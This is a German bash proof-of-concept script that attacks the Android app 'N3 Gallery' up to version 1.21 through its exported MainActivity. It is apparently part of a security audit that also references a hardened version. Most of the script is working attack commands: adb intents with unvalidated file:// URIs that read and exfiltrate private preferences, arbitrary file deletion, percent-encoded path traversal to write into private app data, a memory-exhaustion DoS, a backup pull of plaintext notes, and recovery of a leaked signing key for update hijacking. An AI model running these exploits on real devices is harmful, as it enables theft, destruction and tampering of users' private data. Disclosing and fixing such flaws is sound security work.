#!/usr/bin/env bash
# =============================================================================
#  N3 Gallery <= 1.21 - Angriffsskript (PoC, nur fuer eigene Geraete/Tests)
#
#  Benoetigt: adb + ein Geraet mit installierter N3 Gallery.
#  KEINE Root-Rechte, KEINE Berechtigungen fuer die angreifende App.
#
#  Alle Aufrufe zielen auf die exportierte MainActivity:
#      com.n3vibecode.gallery/.ui.MainActivity
# =============================================================================
set -u

PKG="com.n3vibecode.gallery"
MAIN="$PKG/.ui.MainActivity"
FP="$PKG.fileprovider"

hr() { printf '\n\033[1m=== %s ===\033[0m\n' "$1"; }
run() { printf '  $ %s\n' "$*"; "$@" 2>&1 | sed 's/^/    /'; }

hr "0) Ziel pruefen"
run adb shell pm list packages | grep -i n3vibecode || {
  echo "  [!] $PKG nicht installiert."; exit 1; }
echo "  -- installierte Version / Signatur --"
run adb shell dumpsys package "$PKG" | grep -E "versionName|versionCode|signatures|firstInstall" | head

hr "1) Angriffsflaeche: welche Komponenten sind exportiert?"
echo "  Erwartung: MainActivity exported=true mit intent-filter image/*"
run adb shell dumpsys package "$PKG" | grep -A6 "Activity Resolver Table" | head -20

hr "2) [V4] allowBackup auslesen"
echo "  Erwartung ungepatcht: flags=[ ... ALLOW_BACKUP ... ] und KEINE dataExtractionRules"
run adb shell dumpsys package "$PKG" | grep -E "flags=|pkgFlags=|dataExtractionRules|fullBackupContent" | head

hr "3) [V1] unvalidierte URI in die Galerie schleusen (Lesen)"
echo "  Die Galerie liest alles, worauf SIE Zugriff hat - Pfad bestimmt der Angreifer."
run adb shell am start -a android.intent.action.VIEW -n "$MAIN" \
  -d "file:///data/data/$PKG/shared_prefs/n3_gallery_meta.xml" -t image/png
echo "  -> Opfer tippt auf 'Teilen': private Notizen werden exfiltriert."

hr "4) [V3] beliebige Datei LOESCHEN ohne MediaStore-Systemdialog"
echo "  directDelete(): File(uri.path).delete() fuer jedes Schema != 'content'."
echo "  ACHTUNG: zerstoert echt eine Datei. Pfad vorher anpassen!"
DRY="${DRY_RUN:-1}"
TARGET="file:///storage/emulated/0/Download/PoC-loesch-mich.jpg"
if [ "$DRY" = "1" ]; then
  echo "  [DRY_RUN=1] nur Anzeige, kein Start. Zum Ausfuehren: DRY_RUN=0 $0"
  echo "    adb shell am start -a android.intent.action.VIEW -n $MAIN -d '$TARGET' -t image/jpeg"
else
  run adb shell am start -a android.intent.action.VIEW -n "$MAIN" -d "$TARGET" -t image/jpeg
fi

hr "5) [V2] Path Traversal beim Schreiben"
echo "  Uri.lastPathSegment() dekodiert %2e%2e%2f zu '../'"
echo "  Ziel: File(cacheDir/share, '../../shared_prefs/pwn.xml')"
run adb shell am start -a android.intent.action.VIEW -n "$MAIN" \
  -d "content://$FP/attack/%2e%2e%2f%2e%2e%2fshared_prefs%2fpwn.xml" -t image/png

hr "6) [V2b] Traversal-Proof ohne Fremd-App (Kotext pruefen)"
echo "  Zeigt, dass Android Prozent-Kodierung im letzten Pfadsegment dekodiert:"
run adb shell am start -a android.intent.action.VIEW -n "$MAIN" \
  -d "content://media/external/images/media/1/%2e%2e%2f%2e%2e%2ftest" -t image/png

hr "7) DoS: endloser Stream gegen den 256-MB-Puffer"
echo "  HeifSupport.readAll(limit = 256 MB) + largeHeap=true"
echo "  (benoetigt die PoC-App mit PayloadProvider, sonst harmlos)"
run adb shell am start -a android.intent.action.VIEW -n "$MAIN" \
  -d "content://poc.n3gallery.exploit.payload/endless/x.heic" -t image/heic

hr "8) [V4] Backup der privaten Daten ziehen"
echo "  Funktioniert nur bei allowBackup=true UND entsperrtem Geraet."
echo "  Ab Android 12 ist 'adb backup' fuer Apps ohne Opt-in eingeschraenkt -"
echo "  Cloud-Backup / Geraete-Migration sichern die Daten aber weiterhin."
if [ "${DO_BACKUP:-0}" = "1" ]; then
  echo "  -> bestaetige am Geraet OHIN Passwort (unverschluesseltes Backup)"
  run adb backup -noapk -f n3gallery.ab "$PKG"
  echo "  -> jetzt: python3 backup-extract/extract_notes.py n3gallery.ab"
else
  echo "  [DO_BACKUP=1 zum Ausfuehren]"
fi

hr "V12 Ueberschreiben (MediaSaver.overwrite, file://)"
cat <<'TXT'
  Editor -> Speichern ueber eine file://-URI ueberschreibt den Angreifer-Pfad.
  PoC: exploit-app/ExploitActivity.java (Button V12).
  Gehaertet: overwrite() lehnt file:// ab (Result.Failed).
TXT

hr "V11 MetaBackup: Notizen im Klartext im GETEILTEN Speicher"
cat <<'TXT'
  adb pull /sdcard/Pictures/N3\ Gallery/n3-sicherung.json    (API 26-28)
  adb pull /sdcard/Download/N3\ Gallery/n3-sicherung.json    (API 29+)
  dann: python3 backup-extract/read_meta_sicherung.py n3-sicherung.json
  Gehaertet: restoreIfEmpty() filtert importierte URIs (verify_fix.py, Abschnitt E).
TXT

hr "V5/V6 Signatur-Kompromittierung (OHNE Geraet reproduzierbar)"
cat <<'TXT'
  python3 verify_signing.py <pfad-zur-release.apk>
  -> laedt Schluessel + Passwort aus dem Git-Verlauf, entschluesselt den
     privaten Schluessel und gleicht den Fingerabdruck mit der APK ab.
  Gehaertet: Schluessel aus dem Baum, Build bricht ohne echten Key ab,
     CI verweigert Debug- UND den bekannten CI-Schluessel.
TXT

hr "Fazit"
cat <<'TXT'
  Die Galerie ist zu 100 % offline - die Angriffsflaeche ist nicht das Netz,
  sondern die Signatur-Pipeline und die EXPORTIERTE MainActivity mit fremden URIs.

  Reihenfolge der Gefaehrlichkeit (Nummerierung = SICHERHEITS-ANALYSE.md):
    V5   Signaturschluessel + Passwort oeffentlich -> Update-Hijacking (KRITISCH)
    V1   exportierte Activity uebernimmt Fremd-URI unvalidiert -> Einstieg
    V2   Path Traversal beim Schreiben            -> Manipulation privater App-Daten
    V3   willkuerliches Loeschen (file://)        -> Datenverlust, kein Systemdialog
    V12  willkuerliches Ueberschreiben (file://)  -> Manipulation eigener Dateien
    V11  MetaBackup: Notizen Klartext + Auto-Import -> Leck + Injektion
    V6   CI-Fallback auf Debug-Signatur           -> oeffentlicher Signaturschluessel
    V4   allowBackup ohne Rules                   -> Klartext-Notizen im Backup
    V8   DoS 256-MB-Puffer                        -> Absturz durch rechtelose App
    V7   Release ohne Minify/obfuscation          -> erleichtert Reverse Engineering
    V9/V10 geo:/ACCESS_MEDIA_LOCATION             -> Information / Kernfeature

  Gegenmassnahmen: siehe app/ (gehaertete Fassung 1.32-hardened) und
  security/SICHERHEITS-ANALYSE.md
TXT
